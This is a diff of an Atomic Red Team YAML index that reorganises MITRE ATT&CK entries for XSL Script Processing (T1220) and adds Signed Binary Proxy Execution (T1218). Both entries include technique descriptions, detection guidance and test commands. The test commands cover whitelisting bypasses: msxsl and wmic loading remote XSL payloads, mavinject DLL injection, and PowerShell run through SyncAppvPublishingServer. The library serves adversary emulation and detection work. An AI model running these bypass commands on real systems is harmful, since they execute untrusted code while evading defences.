+        Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file. (Citation: subTee WMIC XSL APR 2018) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool.
+
+        Command-line examples: (Citation: subTee WMIC XSL APR 2018)
+
+        * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
+        * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>
+      external_references:
+      - external_id: T1220
+        url: https://attack.mitre.org/techniques/T1220
+        source_name: mitre-attack
+      - url: https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script
+        description: Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting
+          Using <msxsl:script>. Retrieved July 3, 2018.
+        source_name: Microsoft XSLT Script Mar 2017
+      - url: https://www.microsoft.com/download/details.aspx?id=21714
+        description: Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe).
+          Retrieved July 3, 2018.
+        source_name: Microsoft msxsl.exe
+      - url: https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
+        description: netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved
+          July 3, 2018.
+        source_name: Penetration Testing Lab MSXSL July 2017
+      - url: https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html
+        description: Smith, C. (2018, April 17). WMIC.EXE Whitelisting Bypass - Hacking
+          with Style, Stylesheets. Retrieved July 3, 2018.
+        source_name: subTee WMIC XSL APR 2018
+      - url: https://twitter.com/dez_/status/986614411711442944
+        description: Desimone, J. (2018, April 18). Status Update. Retrieved July
+          3, 2018.
+        source_name: Twitter SquiblyTwo Detection APR 2018
+      - url: https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/
+        description: Admin. (2018, March 2). Spear-phishing campaign leveraging on
+          MSXSL. Retrieved July 3, 2018.
+        source_name: Reaqta MSXSL Spearphishing MAR 2018
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_contributors:
+      - Casey Smith
+      - Praetorian
+      x_mitre_data_sources:
+      - Process monitoring
+      - Process command-line parameters
+      - Process use of network
+      - DLL monitoring
+      x_mitre_defense_bypassed:
+      - Anti-virus
+      - Application whitelisting
+      - Digital Certificate Validation
+      x_mitre_detection: |-
+        Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: subTee WMIC XSL APR 2018) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.
+
+        The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.
+      x_mitre_permissions_required:
+      - User
+      x_mitre_remote_support: false
+      x_mitre_platforms:
+      - Windows
+      x_mitre_system_requirements:
+      - Microsoft Core XML Services (MSXML) or access to wmic.exe
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      - phase_name: execution
+        kill_chain_name: mitre-attack
+      modified: '2018-10-31T13:45:13.024Z'
+      created: '2018-10-17T00:14:20.652Z'
+      identifier: T1220
+    atomic_tests:
     - name: MSXSL Bypass using local files
       description: 'Executes the code specified within a XSL script tag during XSL
         transformation using a local payload. Requires download of MSXSL from Microsoft
@@ -7931,11 +8610,11 @@ defense-evasion:
         xmlfile:
           description: Location of the test XML file on the local filesystem.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1127\src\msxsl-xmlfile.xml
+          default: C:\AtomicRedTeam\atomics\T1220\src\msxsl-xmlfile.xml
         xslfile:
           description: Location of the test XSL script file on the local filesystem.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1127\src\msxsl-script.xsl
+          default: C:\AtomicRedTeam\atomics\T1220\src\msxsl-script.xsl
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -7953,16 +8632,56 @@ defense-evasion:
         xmlfile:
           description: Remote location (URL) of the test XML file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1127/src/msxsl-xmlfile.xml
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxsl-xmlfile.xml
         xslfile:
           description: Remote location (URL) of the test XSL script file.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1127/src/msxsl-script.xsl
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxsl-script.xsl
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
 
 '
+    - name: WMIC bypass using local XSL file
+      description: 'Executes the code specified within a XSL script using a local
+        payload.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        wmic_command:
+          description: WMI command to execute using wmic.exe
+          type: string
+          default: process list
+        local_xsl_file:
+          description: Location of the test XSL script file on the local filesystem.
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1220\src\wmic-script.xsl
+      executor:
+        name: command_prompt
+        command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
+
+'
+    - name: WMIC bypass using remote XSL file
+      description: 'Executes the code specified within a XSL script using a remote
+        payload.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        wmic_command:
+          description: WMI command to execute using wmic.exe
+          type: string
+          default: process list
+        remote_xsl_file:
+          description: Remote location of an XSL payload.
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmic-script.xsl
+      executor:
+        name: command_prompt
+        command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}'
 privilege-escalation:
   T1134:
     technique:
@@ -13342,86 +14061,47 @@ execution:
 '
   '':
     technique:
-      id: attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
+      id: attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      name: XSL Script Processing
-      description: |-
-        Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)
-
-        Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018)
-
-        Command-line example: (Citation: Penetration Testing Lab MSXSL July 2017)
-
-        * <code>msxsl.exe customers[.]xml script[.]xsl</code>
-
-        Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file. (Citation: subTee WMIC XSL APR 2018) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool.
-
-        Command-line examples: (Citation: subTee WMIC XSL APR 2018)
-
-        * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
-        * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>
+      name: User Execution
+      description: An adversary may rely upon specific actions by a user in order
+        to gain execution. This may be direct code execution, such as when a user
+        opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193)
+        with the icon and apparent extension of a document file. It also may lead
+        to other execution techniques, such as when a user clicks on a link delivered
+        via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads
+        to exploitation of a browser or application vulnerability via [Exploitation
+        for Client Execution](https://attack.mitre.org/techniques/T1203). While User
+        Execution frequently occurs shortly after Initial Access it may occur at other
+        phases of an intrusion, such as when an adversary places a file in a shared
+        directory or on a user's desktop hoping that a user will click on it.
       external_references:
-      - external_id: T1220
-        url: https://attack.mitre.org/techniques/T1220
+      - external_id: T1204
+        url: https://attack.mitre.org/techniques/T1204
         source_name: mitre-attack
-      - url: https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script
-        description: Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting
-          Using <msxsl:script>. Retrieved July 3, 2018.
-        source_name: Microsoft XSLT Script Mar 2017
-      - url: https://www.microsoft.com/download/details.aspx?id=21714
-        description: Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe).
-          Retrieved July 3, 2018.
-        source_name: Microsoft msxsl.exe
-      - url: https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
-        description: netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved
-          July 3, 2018.
-        source_name: Penetration Testing Lab MSXSL July 2017
-      - url: https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html
-        description: Smith, C. (2018, April 17). WMIC.EXE Whitelisting Bypass - Hacking
-          with Style, Stylesheets. Retrieved July 3, 2018.
-        source_name: subTee WMIC XSL APR 2018
-      - url: https://twitter.com/dez_/status/986614411711442944
-        description: Desimone, J. (2018, April 18). Status Update. Retrieved July
-          3, 2018.
-        source_name: Twitter SquiblyTwo Detection APR 2018
-      - url: https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/
-        description: Admin. (2018, March 2). Spear-phishing campaign leveraging on
-          MSXSL. Retrieved July 3, 2018.
-        source_name: Reaqta MSXSL Spearphishing MAR 2018
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_version: '1.0'
-      x_mitre_contributors:
-      - Casey Smith
-      - Praetorian
       x_mitre_data_sources:
-      - Process monitoring
-      - Process command-line parameters
-      - Process use of network
-      - DLL monitoring
-      x_mitre_defense_bypassed:
       - Anti-virus
-      - Application whitelisting
-      - Digital Certificate Validation
+      - Process command-line parameters
+      - Process monitoring
       x_mitre_detection: |-
-        Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: subTee WMIC XSL APR 2018) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.
+        Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.
 
-        The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.
+        Anti-virus can potentially detect malicious documents and files that are downloaded and execuited on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) and [Scripting](https://attack.mitre.org/techniques/T1064).
       x_mitre_permissions_required:
       - User
-      x_mitre_remote_support: false
       x_mitre_platforms:
+      - Linux
       - Windows
-      x_mitre_system_requirements:
-      - Microsoft Core XML Services (MSXML) or access to wmic.exe
+      - macOS
       type: attack-pattern
       kill_chain_phases:
-      - phase_name: defense-evasion
-        kill_chain_name: mitre-attack
       - phase_name: execution
         kill_chain_name: mitre-attack
-      modified: '2018-10-31T13:45:13.024Z'
-      created: '2018-10-17T00:14:20.652Z'
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2018-04-18T17:59:24.739Z'
     atomic_tests: []
   T1173:
     technique:
@@ -14755,6 +15435,108 @@ execution:
           sc.exe create #{service_name} binPath= #{executable_command}
           sc.exe start #{service_name}
           sc.exe delete #{service_name}
+  T1218:
+    technique:
+      id: attack-pattern--457c7820-d331-465a-915e-42f85500ccc4
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Signed Binary Proxy Execution
+      description: |-
+        Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.
+
+        ### Mavinject.exe
+        Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)
+
+        <code>"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" <PID> /INJECTRUNNING <PATH DLL></code>
+        <code>C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL></code>
+
+        ### SyncAppvPublishingServer.exe
+        SyncAppvPublishingServer.exe can be used to run powershell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)
+
+        Several others binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)
+      external_references:
+      - external_id: T1218
+        url: https://attack.mitre.org/techniques/T1218
+        source_name: mitre-attack
+      - url: https://twitter.com/gn3mes1s/status/941315826107510784
+        description: Giuseppe. (2017, December 14). gN3mes1s Status Update. Retrieved
+          April 10, 2018.
+        source_name: Twitter gN3mes1s Status Update MavInject32
+      - url: https://twitter.com/monoxgas/status/895045566090010624
+        description: Landers, N. (2017, August 8). monoxgas Status Update. Retrieved
+          April 10, 2018.
+        source_name: Twitter monoxgas Status Update SyncAppvPublishingServer
+      - url: https://github.com/api0cradle/UltimateAppLockerByPassList
+        description: Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved
+          April 10, 2018.
+        source_name: GitHub Ultimate AppLocker Bypass List
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - Process monitoring
+      - Process command-line parameters
+      x_mitre_contributors:
+      - Praetorian
+      x_mitre_defense_bypassed:
+      - Application whitelisting
+      - Digital Certificate Validation
+      x_mitre_detection: Monitor processes and command-line parameters for signed
+        binaries that may be used to proxy execution of malicious files. Correlate
+        activity with other suspicious behavior to reduce false positives that may
+        be due to normal benign use by users and administrators.
+      x_mitre_permissions_required:
+      - User
+      x_mitre_remote_support: false
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      - phase_name: execution
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2018-04-18T17:59:24.739Z'
+      identifier: T1218
+    atomic_tests:
+    - name: mavinject - Inject DLL into running process
+      description: 'Injects arbitrary DLL into running process specified by process
+        ID. Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to inject
+          type: Path
+          default: C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll
+        process_id:
+          description: PID of process receiving injection
+          type: string
+          default: 1000
+      executor:
+        name: command_prompt
+        command: 'mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}
+
+'
+    - name: SyncAppvPublishingServer - Execute arbitrary PowerShell code
+      description: 'Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.
+        Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        powershell_code:
+          description: PowerShell code to execute
+          type: string
+          default: Start-Process calc.exe
+      executor:
+        name: command_prompt
+        command: 'SyncAppvPublishingServer.exe "n; #{powershell_code}"
+
+'
   T1216:
     technique:
       id: attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe
@@ -15170,50 +15952,6 @@ execution:
         command: 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe #{filename}
 
 '
-    - name: MSXSL Bypass using local files
-      description: 'Executes the code specified within a XSL script tag during XSL
-        transformation using a local payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        xmlfile:
-          description: Location of the test XML file on the local filesystem.
-          type: Path
-          default: C:\AtomicRedTeam\atomics\T1127\src\msxsl-xmlfile.xml
-        xslfile:
-          description: Location of the test XSL script file on the local filesystem.
-          type: Path
-          default: C:\AtomicRedTeam\atomics\T1127\src\msxsl-script.xsl
-      executor:
-        name: command_prompt
-        command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
-
-'
-    - name: MSXSL Bypass using remote files
-      description: 'Executes the code specified within a XSL script tag during XSL
-        transformation using a remote payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        xmlfile:
-          description: Remote location (URL) of the test XML file.
-          type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1127/src/msxsl-xmlfile.xml
-        xslfile:
-          description: Remote location (URL) of the test XSL script file.
-          type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1127/src/msxsl-script.xsl
-      executor:
-        name: command_prompt
-        command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
-
-'
   T1047:
     technique:
       id: attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055
@@ -15485,6 +16223,174 @@ execution:
         command: 'invoke-command -computer_name #{host_name} -scriptblock {#{remote_command}}
 
 '
+  T1220:
+    technique:
+      id: attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: XSL Script Processing
+      description: |-
+        Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)
+
+        Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018)
+
+        Command-line example: (Citation: Penetration Testing Lab MSXSL July 2017)
+
+        * <code>msxsl.exe customers[.]xml script[.]xsl</code>
+
+        Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file. (Citation: subTee WMIC XSL APR 2018) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool.
+
+        Command-line examples: (Citation: subTee WMIC XSL APR 2018)
+
+        * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
+        * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>
+      external_references:
+      - external_id: T1220
+        url: https://attack.mitre.org/techniques/T1220
+        source_name: mitre-attack
+      - url: https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script
+        description: Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting
+          Using <msxsl:script>. Retrieved July 3, 2018.
+        source_name: Microsoft XSLT Script Mar 2017
+      - url: https://www.microsoft.com/download/details.aspx?id=21714
+        description: Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe).
+          Retrieved July 3, 2018.
+        source_name: Microsoft msxsl.exe
+      - url: https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
+        description: netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved
+          July 3, 2018.
+        source_name: Penetration Testing Lab MSXSL July 2017
+      - url: https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html
+        description: Smith, C. (2018, April 17). WMIC.EXE Whitelisting Bypass - Hacking
+          with Style, Stylesheets. Retrieved July 3, 2018.
+        source_name: subTee WMIC XSL APR 2018
+      - url: https://twitter.com/dez_/status/986614411711442944
+        description: Desimone, J. (2018, April 18). Status Update. Retrieved July
+          3, 2018.
+        source_name: Twitter SquiblyTwo Detection APR 2018
+      - url: https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/
+        description: Admin. (2018, March 2). Spear-phishing campaign leveraging on
+          MSXSL. Retrieved July 3, 2018.
+        source_name: Reaqta MSXSL Spearphishing MAR 2018
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_contributors:
+      - Casey Smith
+      - Praetorian
+      x_mitre_data_sources:
+      - Process monitoring
+      - Process command-line parameters
+      - Process use of network
+      - DLL monitoring
+      x_mitre_defense_bypassed:
+      - Anti-virus
+      - Application whitelisting
+      - Digital Certificate Validation
+      x_mitre_detection: |-
+        Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: subTee WMIC XSL APR 2018) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.
+
+        The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.
+      x_mitre_permissions_required:
+      - User
+      x_mitre_remote_support: false
+      x_mitre_platforms:
+      - Windows
+      x_mitre_system_requirements:
+      - Microsoft Core XML Services (MSXML) or access to wmic.exe
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      - phase_name: execution
+        kill_chain_name: mitre-attack
+      modified: '2018-10-31T13:45:13.024Z'
+      created: '2018-10-17T00:14:20.652Z'
+      identifier: T1220
+    atomic_tests:
+    - name: MSXSL Bypass using local files
+      description: 'Executes the code specified within a XSL script tag during XSL
+        transformation using a local payload. Requires download of MSXSL from Microsoft
+        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        xmlfile:
+          description: Location of the test XML file on the local filesystem.
+          type: Path
+          default: C:\AtomicRedTeam\atomics\T1220\src\msxsl-xmlfile.xml
+        xslfile:
+          description: Location of the test XSL script file on the local filesystem.
+          type: Path
+          default: C:\AtomicRedTeam\atomics\T1220\src\msxsl-script.xsl
+      executor:
+        name: command_prompt
+        command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
+
+'
+    - name: MSXSL Bypass using remote files
+      description: 'Executes the code specified within a XSL script tag during XSL
+        transformation using a remote payload. Requires download of MSXSL from Microsoft
+        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        xmlfile:
+          description: Remote location (URL) of the test XML file.
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxsl-xmlfile.xml
+        xslfile:
+          description: Remote location (URL) of the test XSL script file.
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxsl-script.xsl
+      executor:
+        name: command_prompt
+        command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
+
+'
+    - name: WMIC bypass using local XSL file
+      description: 'Executes the code specified within a XSL script using a local
+        payload.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        wmic_command:
+          description: WMI command to execute using wmic.exe
+          type: string
+          default: process list
+        local_xsl_file:
+          description: Location of the test XSL script file on the local filesystem.
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1220\src\wmic-script.xsl
+      executor:
+        name: command_prompt
+        command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
+
+'
+    - name: WMIC bypass using remote XSL file
+      description: 'Executes the code specified within a XSL script using a remote
+        payload.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        wmic_command:
+          description: WMI command to execute using wmic.exe
+          type: string
+          default: process list
+        remote_xsl_file:
+          description: Remote location of an XSL payload.
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmic-script.xsl
+      executor:
+        name: command_prompt
+        command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}'
 lateral-movement:
   T1155:
     technique:
